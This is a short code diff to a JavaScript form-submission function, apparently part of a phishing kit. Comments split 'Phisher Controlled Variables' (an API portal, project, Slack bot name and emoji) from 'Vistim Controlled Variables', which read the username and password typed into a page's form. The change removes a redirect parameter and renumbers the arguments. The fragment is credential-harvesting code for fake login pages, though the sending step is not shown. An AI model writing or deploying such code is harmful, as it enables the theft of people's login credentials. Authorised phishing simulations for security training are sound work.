@@ -1,11 +1,10 @@
-function SubForm(APIPortal,RedirectURL,FormName){
+function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji){
 	// Phisher Controlled Variables
 	var APIPortal = SubForm.arguments[0];
-	var RedirectURL = SubForm.arguments[1];
-	var FormName = SubForm.arguments[2];
-	var Project = SubForm.arguments[3];
-	var SlackBotName = SubForm.arguments[4];
-	var SlackEmoji = SubForm.arguments[5];
+	var FormName = SubForm.arguments[1];
+	var Project = SubForm.arguments[2];
+	var SlackBotName = SubForm.arguments[3];
+	var SlackEmoji = SubForm.arguments[4];
 	// Vistim Controlled Variables
 	var Username = document.getElementById("username").value;
 	var Password = document.getElementById("password").value;
